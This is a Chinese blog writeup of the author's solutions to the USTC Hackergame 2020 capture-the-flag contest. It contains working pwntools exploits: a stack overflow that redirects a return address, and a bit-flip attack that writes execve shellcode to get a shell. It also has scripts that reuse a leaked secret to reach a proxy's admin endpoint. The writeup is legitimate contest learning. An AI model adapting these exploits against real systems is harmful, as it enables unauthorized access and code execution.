---
title: USTC Hackergame 2020 Writeup
date: 2020-11-21 21:00:00
toc: true
article:
  highlight:
    fold: unfolded
    theme: night-owl
    clipboard: true
categories: SECURITY
tags: 
- CTF
- USTC Hackergame
---

( •̀ ω •́ )y 耶，一星期的 Hackergame 终于结束，最终获得校内第九，总排名六十，总分3000分。
听说有跟我同是 20级 的 dalao 拿到校内第二，简直恐怖如斯 ヽ(*。>Д<)o゜

## 签到

直接审查元素 (Inspect Element) 将 input 的 value 改成 1

![签到](/img/post/image-20201119105434126.webp)

点击提取即可获得 flag 
` flag{hR6Ku81-HappyHacking2020-58eadee9bc}`

<!-- more -->
## 猫咪问答

Q1: **以下编程语言、软件或组织对应标志是哺乳动物的有几个？
Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce.
提示：学术上一般认为龙不属于哺乳动物。**

解：

```
Docker: 鲸鱼 : 哺乳 (1)
Golang: 地鼠 ：哺乳 (2)
Python：蛇：爬行
Plan 9: 兔子： 哺乳 (3)
PHP： 大象 ： 哺乳 (4)
GNU： 角马 ： 哺乳 (5)
LLVM： 龙： ？？
Swift：鸟： 鸟类
Perl：骆驼：哺乳 (6)
GitHub: 章鱼：头足纲 
TortoiseSVN：乌龟： 爬行
FireFox：狐狸：哺乳 (7)
MySQL：海豚：哺乳 (8)
PostgreSQL： 大象：哺乳 (9)
MariaDB：海狮：哺乳 (10)
Linux：企鹅：鸟类
OpenBSD：河豚：鱼类
FreeDOS： Blinky：鱼？
Apache Tomcat：猫：哺乳 (11)
Squid：鱿鱼：头足纲 
openSUSE:变色龙：爬行
Kali：龙：？？
Xfce：老鼠：哺乳(12)
```

答案为 12。

Q2: **第一个以信鸽为载体的 IP 网络标准的 RFC 文档中推荐使用的 MTU (Maximum Transmission Unit) 是多少毫克？**

解： 该标准为 IP over Avian Carriers。找到其 [RFC 标准 ](https://tools.ietf.org/html/rfc1149)， `A typical MTU is 256 milligrams.` 。即答案为 256。


Q3: **USTC Linux 用户协会在 2019 年 9 月 21 日自由软件日活动中介绍的开源游戏的名称共有几个字母？
提示：活动记录会在哪里？**

解： 利用搜索引擎查找关键字 `USTC Linux 2019 年 9 月 21 日自由软件日活动` 找到 [活动新闻页](https://news.ustclug.org/2019/09/2019-sfd-ustc/) ，`最后一项是李文睿同学介绍了开源游戏 Teeworlds` ，Teeworlds 有九个字符， 即答案为 9 。


Q4: **中国科学技术大学西校区图书馆正前方（西南方向） 50 米 L 型灌木处共有几个连通的划线停车位？
提示：建议身临其境。**

解： 我找到所有除这题以外的答案后用 burpsuite 遍历从 1 到 20， 找到答案为 9 wwww


Q5: **中国科学技术大学第六届信息安全大赛所有人合计提交了多少次 flag？**

解： 从 Hackergame 首页的 ”相关链接“ 中找到 [新闻稿：学生Linux用户协会第六届信息安全大赛完美收官](https://young.ustc.edu.cn/2020/0727/c17198a439807/page.htm) ， `比赛期间所有人合计提交了 17098 次 flag` ， 即答案为 17098。


flag 为 `flag{b4a31f2a_G00G1e_1s_y0ur_fr13nd_7777892699}`

## 2048

第一反应是 View page source （不是把这游戏玩通关ww），在 `/js/html_actuator.js` 中看到源码

```js
if (won) {
    url = "/getflxg?my_favorite_fruit=" + ('b'+'a'+ +'a'+'a').toLowerCase();
  } else {
    url = "/getflxg?my_favorite_fruit=";
  }
```

于是访问 `/getflxg?my_favorite_fruit=banana` 即可得到 flag： `flxg{8G6so5g-FLXG-94887845e7}`

## 一闪而过的 Flag

直接在 cmd 运行下载下来的可执行文件。

![一闪而过的 Flag](/img/post/image-20201119111317324.webp)

得到 `flag{Are_you_eyes1ght_g00D?_can_you_dIst1nguish_1iI?}`

## 从零开始的记账工具人

先把下载下来的 xlsx 文件用 Excel 打开然后转换成 csv 文件以方便处理。
之后用 python 的 cn2an 库把中文大写数字转成阿拉伯数字。
以下为我的垃圾代码

```python
import csv
import cn2an
import re
from decimal import Decimal, getcontext

with open('bills.csv', encoding="utf-8") as csv_file:
    csv_reader = csv.reader(csv_file, delimiter=',')
    line_count = 0
    getcontext().prec = 7
    sum = Decimal('0.00')
    for row in csv_reader:
        if line_count == 0:
            print(f'Column names are {", ".join(row)}')
            line_count += 1
        else:
            print(f"{row[1]} 个 {row[0]}")
            meow = Decimal('0.00')
            if re.match(r"(.*)元(.*)角(.*)分", row[0]):
                meow = Decimal(str(cn2an.cn2an(row[0].replace('元','点').replace('角', '').replace('分', ''), 'normal'))) * Decimal(row[1])
                sum += meow
            elif re.match(r"(.*)元(.*)角", row[0]):
                meow = Decimal(str(cn2an.cn2an(row[0].replace('元','点').replace('角', '').replace('分', ''), 'normal'))) * Decimal(row[1])
                sum += meow
            elif re.match(r"(.*)元(.*)分", row[0]):
                meow = Decimal(str(cn2an.cn2an(row[0].replace('元','点').replace('角', '').replace('分', ''), 'normal'))) * Decimal(row[1])
                sum += meow
            elif re.match(r"(.*)角(.*)分", row[0]):
                meow = Decimal(str(cn2an.cn2an('零点'+row[0].replace('角', '').replace('分', ''), 'normal'))) * Decimal(row[1])
                sum+= meow
            elif re.match(r"(.*)分", row[0]):
                meow = Decimal(str(cn2an.cn2an('零点零'+row[0].replace('角', '').replace('分', ''), 'normal'))) * Decimal(row[1])
                sum+= meow
            elif re.match(r"(.*)角", row[0]):
                meow = Decimal(str(cn2an.cn2an('零点'+row[0].replace('角', ''), 'normal'))) * Decimal(row[1])
                sum+= meow
            elif re.match(r"(.*)元整", row[0]):
                meow = Decimal(str(cn2an.cn2an(row[0].replace('元整', ''), 'normal'))) * Decimal(row[1])
                sum += meow
            else:
                raise Exception('nooo')
            line_count += 1 
    print(f'Processed {line_count} lines.\n {sum}')
```

算出来的结果是 12598.55， 所以 flag 为 `flag{12598.55}`
事后跑去看了别人的 writeup， 发现有个跟我用同样库的人比我写的简洁太多了， 这里也放出来 ;3

```python
import cn2an

tot = 0
for i in open('bills.csv', encoding='utf-8').readlines()[1:]:
    a, b = i.split(',')
    #print(a, b)
    b = int(b)
    x = 0
    y = 0
    z = 0
    if '元' in a:
        x, a = a.split('元', 1)
        x = int(cn2an.cn2an(x, 'smart'))
    if '角' in a:
        y, a = a.split('角', 1)
        y = int(cn2an.cn2an(y, 'smart'))
    if '分' in a:
        z, a = a.split('分', 1)
        z = int(cn2an.cn2an(z, 'smart'))
    #print(x, y, z)
    tot += (x + y * 0.1 + z * 0.01) * b
print(tot)
```

[来源: mcfx](https://github.com/USTC-Hackergame/hackergame2020-writeups/blob/master/players/mcfx/writeup.md#%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84%E8%AE%B0%E8%B4%A6%E5%B7%A5%E5%85%B7%E4%BA%BA)

## 超简单的世界模拟器

### 蝴蝶效应

用 [Lightweight Spaceship](https://www.conwaylife.com/wiki/Lightweight_spaceship) 即可。
Payload 为

```
000000000000000
000000000000000
100100000000000
000010000000000
100010000000000
011110000000000
000000000000000
000000000000000
000000000000000
000000000000000
000000000000000
000000000000000
000000000000000
000000000000000
000000000000000
```

即可获得 flag： `flag{D0_Y0U_l1k3_g4me_0f_l1fe?_464d00452d}`

## 从零开始的火星文生活

在 UTF-8 下读取文件为

```

脦脪鹿楼脝脝脕脣 拢脠拢谩拢茫拢毛拢氓拢貌拢莽拢谩拢铆拢氓 碌脛路镁脦帽脝梅拢卢脥碌碌陆脕脣脣眉脙脟碌脛 拢忙拢矛拢谩拢莽拢卢脧脰脭脷脦脪掳脩 拢忙拢矛拢谩拢莽 路垄赂酶脛茫拢潞
拢忙拢矛拢谩拢莽拢没拢脠拢麓拢枚拢鲁拢脽拢脝拢玫拢脦拢脽拢梅拢卤拢脭拢猫拢脽拢鲁拢卯拢茫拢掳拢盲拢卤拢卯拢莽拢脽拢麓拢脦拢盲拢脽拢盲拢鲁拢茫拢掳拢脛拢卤拢卯拢脟拢脽拢鹿拢帽拢脛拢虏拢脪拢赂拢猫拢贸拢媒
驴矛脠楼卤脠脠眉脝陆脤篓脤谩陆禄掳脡拢隆
虏禄脪陋脭脵掳脩脮芒路脻脨脜脧垄脳陋路垄赂酶脝盲脣没脠脣脕脣拢卢脪陋脢脟卤禄路垄脧脰戮脥脭茫赂芒脕脣拢隆

```

找到个 [乱码还原网站](http://www.mytju.com/classcode/tools/messyCodeRecover.asp) ，将文本输入。查看 `原来编码（假设）` 为 `UTF-8`、 `现在编码（假设）` 为 `GBK` 下的文本。

```
ÎÒ¹¥ÆÆÁË £È£á£ã£ë£å£ò£ç£á£í£å µÄ·þÎñÆ÷£¬Íµµ½ÁËËüÃÇµÄ £æ£ì£á£ç£¬ÏÖÔÚÎÒ°Ñ £æ£ì£á£ç ·¢¸øÄã£º
£æ£ì£á£ç£û£È£´£ö£³£ß£Æ£õ£Î£ß£÷£±£Ô£è£ß£³£î£ã£°£ä£±£î£ç£ß£´£Î£ä£ß£ä£³£ã£°£Ä£±£î£Ç£ß£¹£ñ£Ä£²£Ò£¸£è£ó£ý
¿ìÈ¥±ÈÈüÆ½Ì¨Ìá½»°É£¡
²»ÒªÔÙ°ÑÕâ·ÝÐÅÏ¢×ª·¢¸øÆäËûÈËÁË£¬ÒªÊÇ±»·¢ÏÖ¾ÍÔã¸âÁË£¡
```

把该文本再还原一次，发现 `原来编码（假设）` 为 `GBK`、 `现在编码（假设）` 为 `iso-8859-1` 时文本已还原。

```
我攻破了 Ｈａｃｋｅｒｇａｍｅ 的服务器，偷到了它们的 ｆｌａｇ，现在我把 ｆｌａｇ 发给你：
ｆｌａｇ｛Ｈ４ｖ３＿ＦｕＮ＿ｗ１Ｔｈ＿３ｎｃ０ｄ１ｎｇ＿４Ｎｄ＿ｄ３ｃ０Ｄ１ｎＧ＿９ｑＤ２Ｒ８ｈｓ｝
快去比赛平台提交吧！
不要再把这份信息转发给其他人了，要是被发现就糟糕了！
```

所以 flag 为 `flag{H4v3_FuN_w1Th_3nc0d1ng_4Nd_d3c0D1nG_9qD2R8hs}` 。

## 自复读的复读机

### 反向复读

从 [Stackoverflow - shortest python quine?](https://stackoverflow.com/questions/6223285/shortest-python-quine) 找一个方便构造的进行构造。

Payload 为 

``` python
print((lambda s:(s%s)[::-1])('print((lambda s:(s%%s)[::-1])(%r), end="")'), end="")
```

得到 flag: `flag{Yes!_Y0U_h4v3_a_r3v3rs3d_Qu1ne_0850bb9e57}`

### 哈希复读

同反向复读， 找了一个新的来构造：

``` python
import hashlib;exec(s:='print(hashlib.sha256(("import hashlib;exec(s:=%r)"%s).encode()).hexdigest(), end="")')
```

得到 flag: `flag{W0W_Y0Ur_c0de_0utputs_1ts_0wn_sha256_423ae2f900}`

## 233 同学的字符串工具

### 字符串大写工具

题目源码为

```python
import re
def to_upper(s):
    r = re.compile('[fF][lL][aA][gG]')
    if r.match(s):
        print('how dare you')
    elif s.upper() == 'FLAG':
        print('yes, I will give you the flag')
        print(open('/flag1').read())
    else:
        print('%s' % s.upper())
```

所以当输入被转为大写时相等于 FLAG 的话，可获得 flag1。
但是需要绕过 regex `[fF][lL][aA][gG]` 的匹配才行，所以我查了 [Python 官方文档](https://docs.python.org/3/library/stdtypes.html?highlight=upper#str.upper) 关于 str.upper 的原理。

```
The uppercasing algorithm used is described in section 3.13 of the Unicode Standard.
```

遂读 [section 3.13 of the Unicode Standard](https://www.unicode.org/versions/Unicode9.0.0/ch03.pdf) ， 发现有特例 `ß` 的 upper() 是 `SS` ，而这样的特例被公布在  [SpecialCasing.txt](https://unicode.org/Public/UNIDATA/SpecialCasing.txt) 中。
发现 `FB02; FB02; 0046 006C; 0046 004C; # LATIN SMALL LIGATURE FL` 是可利用的， 在 UNICODE 中 U+FB02 为 `ﬂ` ( 连在一起的 f 和 l )， 所以构造 payload `ﬂag` 即可绕过 regex 匹配，取得 flag1： `flag{badunic0debadbad_db6d64b981}`。

### 编码转换工具

题目源码为

```python
def to_utf8(s):
    r = re.compile('[fF][lL][aA][gG]')
    s = s.encode() # make it bytes
    if r.match(s.decode()):
        print('how dare you')
    elif s.decode('utf-7') == 'flag':
        print('yes, I will give you the flag')
        print(open('/flag2').read())
    else:
        print('%s' % s.decode('utf-7'))
```

同字符串大写工具需要绕过 regex 的匹配，
UTF-7 有一套特别的编码方式， 我使用了 [fiunis NodeJS 库](https://npm.runkit.com/fiunis) 对 `f` 进行 UTF-7 编码

```js
const fiunis = require("fiunis")
console.log(fiunis.encode('f')) // &+AGY-;
```

所以构造 payload `+AGY-lag` 转换成 UTF-8 后就是 `flag` ， 取得 flag2 `flag{please_visit_www.utf8everywhere.org_f2f97cf768}`

## 233 同学的 Docker

想着要下载安装 Docker 好麻烦啊... 于是在 Github 上找到了 [graboid - Clientless Docker Image Downloader](https://github.com/blacktop/graboid/tree/0.15.3) 。
把它下载下来后， 执行 `graboid 8b8d3c8324c7/stringtool` ， 执行完毕后 Image 会被保存为 `8b8d3c8324c7_stringtool_latest.tar.gz` 。
这时候再执行 `graboid extract 8b8d3c8324c7_stringtool_latest.tar.gz` 

![graboid extract](/img/post/image-20201119121620347.webp)

最下面一个 layer 是 `rm /code/flag.txt` ， 倒数第二个 layer 保存着 flag.txt, 按下 space 键即可把 flag.txt extract 出来。
所以 flag 是 `flag{Docker_Layers!=PS_Layers_hhh}`

## 从零开始的 HTTP 链接

最开始我用 nmap 的 http-fetch 脚本来下载端口 0 的内容。

```bash
nmap -p 0 -sV --script http-fetch --script-args destination=/tmp/ustc 202.38.93.111
```

之后 index.html 内容会被保存在 `/tmp/ustc/202.38.93.111/0/index.html`
发现 index.html 用 xterm 来连接 websocket shell...

然后试着用 NodeJS 的 [WebSocket 库](https://www.npmjs.com/package/ws) ， 发现能够连接上端口零，遂获取 flag。脚本我就不放出来了（没存起来 ;3）。

## 来自一教的图片

用 Mathematica 对图像进行傅里叶变换。以下为 Mathematica 代码：

```mathematica
img = Import["4f_system_middle.bmp"]
img2 = ColorConvert[img, "GrayLevel"];
ArrayPlot[Log[1 + Abs[Fourier[ImageData[img2]]]]]
```

[（来源）](https://zhidao.baidu.com/question/92592226.html)

获得这样的图像
![transform](/img/post/transform.webp)

flag 为 `flag{Fxurier_xptics_is_fun}`

## 超简陋的 OpenGL 小程序

具体其实我也忘记是怎么解的了... 依稀记得是网上找了不同的 `basic_lighting.fs` 和 `basic_lighting.vs`。然后乱调参数发现竟然能够显示出 flag wwww。

`basic_lighting.fs`

```
#version 330 core   //版本号
out vec4 FragColor; //输出像素颜色

in vec3 ourColor; //输入颜色 为上一步输出
//in vec3 ourPosition;

void main()
{
    
    FragColor = vec4(ourColor, 1.0f); //输出  
	//FragColor = vec4(ourPosition, 1.0f);
    
}
```

`basic_lighting.vs`

```
#version 330 core    //版本号
layout (location = 0) in vec3 aPos; //顶点位置 位置0
layout (location = 1) in vec3 aColor; //顶点颜色 位置1

out vec3 ourColor; //输出颜色
//out vec3 ourPosition;
uniform float YOffset; //声明一个偏移量

void main()
{
    //偏移量改变顶点位置
    gl_Position = vec4(aPos.x, aPos.y - YOffset, aPos.z-1, 1);
    ourColor = aColor; //为输出颜色赋值 
	//ourPosition = aPos;
    
}
```

`aPos.z-1` 更改了 z 轴的视角 （应该 ?
然后就可以显示出 flag 了。![超简陋的 OpenGL 小程序](/img/post/image-20201120095714683.webp)

flag 为 `flag{glGraphicsHappy(233);}`

## 生活在博弈树上

### 始终热爱大地

最开始的时候还以为是要破解那个 AI 算法以赢过 AI www， 后来发现这应该是一个 pwn 题， 因为使用了 gets() 函数，所以可以覆盖掉栈中的返回地址， 使我们跳转到 success 的地址赢得这场游戏，获取 flag。

```python
from pwn import *
from sys import *

if '-r' in argv:
    s = remote('202.38.93.111', 10141)
    s.send("<token here :3>\n")
else:
    s = process('./tictactoe')

ret_address = 0x402551
s.recvuntil("): ")
s.sendline("(0,1)")
s.sendline(("(1,1)" + "a"*147).encode() + p32(ret_address))
s.interactive()
```

最终获得 flag： `flag{easy_gamE_but_can_u_get_my_shel1}`

## 超基础的数理模拟器

我说我手敲 Mathematica 三个小时多你信不信...

## 超安全的代理服务器

### 找到 Secret

配置了环境参数 `SSLKEYLOGFILE` 以让 Wireshark 可以解密 TLS 流量。
![超安全的代理服务器 - 找到 Secret](/img/post/image-20201120101856420.webp)

即可观察到 http2 push， 获得 flag: `flag{d0_n0t_push_me}`

### 入侵管理中心

为了方便我调试，我用了 [node-libcurl](https://github.com/JCMais/node-libcurl) 来获取 [http2 push](https://github.com/JCMais/node-libcurl/blob/develop/examples/20-http2-server-push.js) 的内容。
`getSecret.js`

```js
const fs = require("fs");
const path = require("path");

const {
  Curl,
  CurlPush,
  Easy,
  Multi,
  CurlHttpVersion,
} = require("node-libcurl");

console.log(Curl.getVersionInfoString());

const multi = new Multi();

const outFilePath = path.join(__dirname, "result.out"); // 把 http2 push 的内容写入 result.out

const handlesData = new Map();

multi.onMessage((error, handle, errorCode) => {
  const responseCode = handle.getInfo("RESPONSE_CODE").data;
  const urlInfo = handle.getInfo("EFFECTIVE_URL").data;
  const url = handle.private.url || urlInfo;
  const redirect = handle.getInfo("REDIRECT_URL").data;

  if (error) {
    console.error(
      `Handle for ${url} (${redirect}) returned error: "${error.message}" with errcode: ${errorCode}`
    );
  } else {
    console.log(
      `Handle for ${url} (${redirect}) finished with response code ${responseCode}`
    );
  }

  if (handle.private && handle.private.fd) {
    fs.closeSync(handle.private.fd);
  }

  const data = handlesData.get(handle);
  console.log(data);

  multi.removeHandle(handle);
  handle.close();
});
multi.setOpt(
  Multi.option.PUSHFUNCTION,
  (_parent, duplicatedHandle, pushFrameHeaders) => {
    console.log(
      "-> received push frame with %d headers",
      pushFrameHeaders.numberOfHeaders
    );

    for (let i = 0; i < pushFrameHeaders.numberOfHeaders; i++) {
      const header = pushFrameHeaders.getByIndex(i);
      console.log("|-> header %d value is: %s", i, header);
    }

    const scheme = pushFrameHeaders.getByName(":scheme");
    const authority = pushFrameHeaders.getByName(":authority");
    const path = pushFrameHeaders.getByName(":path");
    console.log('|-> :scheme header value is: "%s"', scheme);
    console.log('|-> :authority header value is: "%s"', authority);
    console.log('|-> :path header value is: "%s"', path);

    if (1) {
      console.log("||-> push allowed as it is a known file");

      console.log("||-> adding callback to write file to disk");

      duplicatedHandle.private = {
        fd: fs.openSync(outFilePath, "w+"),
        position: 0,
        url: `${scheme}://${authority}${path}`,
      };
      duplicatedHandle.setOpt("WRITEFUNCTION", function (data, size, nmemb) {
        const written = fs.writeSync(
          this.private.fd,
          data,
          0,
          size * nmemb,
          this.private.position
        );
        this.private.position += written;
        return written;
      });
      return CurlPush.Ok;
    }

    console.log("||-> unknown file - denying push");
    return CurlPush.Deny;
  }
);

process.on("exit", () => {
  multi.close();
});

const handle = new Easy();
handle.private = {};
handle.setOpt("URL", "https://146.56.228.227/");
handle.setOpt("SSL_VERIFYPEER", false);
handle.setOpt("FOLLOWLOCATION", true);
handle.setOpt("HTTP_VERSION", CurlHttpVersion.V2Tls);
handle.setOpt("VERBOSE", true);
handle.setOpt("WRITEFUNCTION", function onData(data, n, nmemb) {
  let existingData = handlesData.get(this);

  if (!existingData) {
    existingData = [];
    handlesData.set(this, existingData);
  }

  existingData.push(data);

  return n * nmemb;
});

multi.addHandle(handle);
```

`accessAdmin.js`

```js
const { Curl, CurlHttpVersion } = require("node-libcurl");
const fs = require("fs");

const curl = new Curl();
const fileContent = fs.readFileSync("./result.out").toString();
const secret = fileContent.match(/([a-zA-Z0-9]{10}) !/)[1];

curl.setOpt("URL", "http://0.0.0.0:8080/");
curl.setOpt("SSL_VERIFYPEER", 0);
curl.setOpt("SSL_VERIFYHOST", 0);
curl.setOpt("PROXY_SSL_VERIFYPEER", 0);
curl.setOpt("PROXY_SSL_VERIFYHOST", 0);
curl.setOpt("HTTP_VERSION", CurlHttpVersion.V2_0);
curl.setOpt("PROXY", "https://146.56.228.227:443/");
curl.setOpt("PROXYHEADER", [`Secret: ${secret}`]);
curl.setOpt("REFERER", "http://146.56.228.227/");
curl.setOpt("HTTPPROXYTUNNEL", 1); // 我因为没设置这个参数失败了几个小时...
curl.setOpt("FOLLOWLOCATION", true);
curl.setOpt("VERBOSE", 1);

curl.on("end", function (statusCode, data, headers) {
  console.info(statusCode);
  console.info(headers);
  console.info("---");
  console.info(data);
  console.info("---");
  console.info(this.getInfo("TOTAL_TIME"));

  this.close();
});

curl.on("error", curl.close.bind(curl));
curl.perform();
```

关于 `accessAdmin.js` 的 `HTTPPROXYTUNNEL` 参数, 我失败了几个小时发现是因为我没启用 HTTP Proxy Tunnel 参数...
根据 [MDN 文档](https://developer.mozilla.org/en-US/docs/Web/HTTP/Proxy_servers_and_tunneling)：

HTTP tunneling is using a protocol of higher level (HTTP) to transport a lower level protocol (TCP).

The HTTP protocol specifies a request method called `CONNECT`. 
It starts two-way communications with the requested resource and can be used to open a tunnel. This is how a client behind an HTTP proxy can access websites using SSL (i.e. HTTPS, port 443). 

(同理，使 client behind an HTTP2 over TLS proxy can access websites without using SSL.)

执行 `node getSecret.js && node accessAdmin.js` 即可得到 flag。

## 超精准的宇宙射线模拟器

最开始实在是没有思路，就在 Google 上搜一搜，结果还真的给我搜到原题了。

原题 writeup: https://ctftime.org/writeup/7894
此 Writeup 的思路总结如下：

1. 使程序循环运作
2. 突破 mprotect 防御
3. 绕过翻转比特 <= 7 的限制
4. 使左移运算无效
5. 写入 shellcode、跳转到 shellcode 所在地址。

经过我几个小时的调试， 总结思路如下：

1. 输入 `0x401296 6` 使程序循环 (这个纯粹是我 fuzz 出来的 www, 会使本来的 `call exit` 变成 `call _dl_relocate_static_pie`)
2. 输入 `0x401260 6` 使 `cmp eax, 0x7` 变成 `cmp eax,0x47`，<= 7 的比特翻转限制变成 <= 71 了！
3. 输入 `0x401279 1` 使 `shl edx, cl` 下一行 `mov eax, edx` 变成 `mov edx, edx` 使 left shift 无效。
4. 输入 `0x401262 55` 使 `jg 0x40129a` 变成 `jg 0x401263` 使 cmp 检查无效，无论检查为真或假，都会继续执行下一行。
5. 找到一个合适的位置写入 shellcode，`0x4011b6` 就挺不错的。由于地址内容不为空，所以需要 xor 它们本身的值来清除内容。
6. 往 `0x4011b6` 写入 shellcode。
7. 输入 `0x4012a7 78` 使循环用的 `jmp 0x4011f0` 变成 `jmp 0x4011b6` 跳转到 shellcode 所在位置。

利用脚本如下：

```python
from pwn import *
from sys import *
from time import sleep

if '-d' in argv:
    context.log_level=1

if '-r' in argv:
    s = remote('202.38.93.111', 10231)
    s.send('<token here ;3>\n')
else:
    s = process('./bitflip')

e=ELF('./bitflip')


sleep(.4)
s.send('0x401296 6' + '\n')    
log.info('Binary looped!')

sleep(.4)
s.send('0x401260 6' + '\n')    
log.info('check <= 7 become check <= 71 , cmp eax,0x47')

sleep(.4)
s.send('0x401279 1' + '\n')    
log.info('disable shifting')

sleep(.4)
s.send('0x401262 55' + '\n')    
log.info('jg 0x40129a --> jg 0x401263 (bypassed cmp check)')

clear_content = "\xf3\x0f\x1e\xfa\x55\x48\x89\xe5\xba\x07\x00\x00\x00\xbe\x00\x10\x00\x00\xbf\x00\x10\x40\x00\xe8\xce\xfe\xff\xff\x90\x5d"

pos = 0
for i in range(0x4011b6, 0x4011b6+len(clear_content), 1):
  byte = ord(clear_content[pos])
  s.send('{} {}\n'.format(hex(i), byte))
  log.info('Clearing {} at {}'.format(hex(byte),hex(i)))
  sleep(.4)
  pos += 1

shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05\x90\x90\x90"
pos_shell = 0
for i in range(0x4011b6, 0x4011d1, 1):
    byte=ord(shellcode[pos_shell])
    s.send('{} {}\n'.format(hex(i), byte))
    log.info('Writting {} at {}'.format(hex(byte),hex(i)))
    sleep(.4)
    pos_shell+=1

s.send('0x4012a7 78\n')
s.interactive()
```

即可 getshell, 执行 `cat flag` 即可获得 flag。

## 不经意传输

### 解密消息

题目源码如下：

```python
from Crypto.PublicKey import RSA
from random import SystemRandom
import os


if __name__ == "__main__":
    random = SystemRandom()

    key = RSA.generate(1024)
    print("n =", key.n)
    print("e =", key.e)

    m0 = int.from_bytes(os.urandom(64).hex().encode(), "big")
    m1 = int.from_bytes(os.urandom(64).hex().encode(), "big")

    x0 = random.randrange(key.n)
    x1 = random.randrange(key.n)
    print("x0 =", x0)
    print("x1 =", x1)

    v = int(input("v = "))
    m0_ = (m0 + pow(v - x0, key.d, key.n)) % key.n
    m1_ = (m1 + pow(v - x1, key.d, key.n)) % key.n
    print("m0_ =", m0_)
    print("m1_ =", m1_)

    guess0 = int(input("m0 = "))
    guess1 = int(input("m1 = "))
    if guess0 == m0:
        print(open("flag1").read())
        if guess1 == m1:
            print(open("flag2").read())
    else:
        print("Nope")
```

易知 $v = x0$ 时 $m0\\_ = m0$ 或 $v = x1$ 时 $m1\\_ = m1$

![不经意传输 - 解密消息](/img/post/image-20201121205238853.webp)

易得 flag1: `flag{U_R_0n_Th3_ha1f_way_0f_succe55_w0rk_h4rder!_3bb495dd53}`

